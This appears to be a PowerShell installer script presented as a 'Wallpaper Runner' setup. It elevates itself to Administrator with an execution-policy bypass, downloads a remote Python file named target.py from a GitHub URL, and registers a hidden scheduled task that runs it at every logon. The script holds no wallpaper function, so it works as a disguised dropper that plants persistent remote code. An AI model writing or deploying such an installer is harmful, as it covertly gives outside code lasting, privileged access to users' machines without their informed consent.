# Ensure running as Administrator
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

Write-Output "[*] Installing Wallpaper Runner..."

# Config
$installPath = "$env:ProgramData\WallpaperRunner"
$scriptUrl = "https://raw.githubusercontent.com/lisenapati/pbl202.24/main/target/target.py"
$pythonPath = (Get-Command python).Source

# Create folder
New-Item -Path $installPath -ItemType Directory -Force | Out-Null

# Download target.py
Invoke-WebRequest -Uri $scriptUrl -OutFile "$installPath\target.py"

# Register Scheduled Task
$action = New-ScheduledTaskAction -Execute $pythonPath -Argument "$installPath\target.py"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
Register-ScheduledTask -TaskName "Wallpaper Runner" -Action $action -Trigger $trigger -Settings $settings -Force

Write-Output "[+] Installed Wallpaper Runner as a scheduled task."
